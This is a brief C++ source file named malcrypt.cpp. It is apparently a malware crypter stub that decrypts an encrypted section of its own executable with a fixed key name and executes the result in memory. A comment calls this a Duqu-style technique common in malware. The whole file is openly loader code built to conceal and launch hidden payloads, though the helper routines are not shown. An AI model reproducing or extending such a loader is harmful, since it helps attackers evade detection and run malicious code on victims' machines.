// malcrypt.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

int _tmain(int argc, _TCHAR* argv[])
{
	HRESULT status = S_OK;
	PCWSTR keyName = L"MalcryptKey0";

	/* 
	 * Using the (now-static keyname), decrypt a PE section.
	 * /SECTION:name,[[!]{!K!PR}][,ALIGN=#]
	 * Improvement: Duqu-style execute of resources, common
	 * malware technique. 
	 * Read: http://blog.w4kfu.com/tag/duqu
	 */

	UINT32 sectionDataSize, encDataSize;
	PBYTE sectionData;
	GetSectionData(argv[0], &sectionDataSize, &sectionData);

	/* Now decrypt the resource. */
	UINT32 decPEDataSize;
	PVOID decPEData;

	if (sectionDataSize == 0) {
		return S_FALSE;
	}

	/* Append the length to the beginning of the ciphertext. */
	memcpy((VOID *) &encDataSize, sectionData, sizeof(UINT32));
	if (encDataSize > sectionDataSize) {
		return S_FALSE;
	}

	status = TlclDecrypt(
		keyName,
		encDataSize,
		(PBYTE) (sectionData + sizeof(UINT32)),
		&decPEDataSize,
		(PBYTE *)&decPEData,
		NULL);

	/* Execute the descrypted resource. */
	ExecData(decPEData);

	/* Free the allocated section. */
	if (sectionDataSize > 0) {
		ZeroAndFree((PVOID*)&sectionData, sectionDataSize);
		sectionDataSize = 0;
	}

	/* Free the decrypted data? */
	ZeroAndFree((PVOID*)&decPEData, decPEDataSize);
	decPEDataSize = 0;

	return status;
}

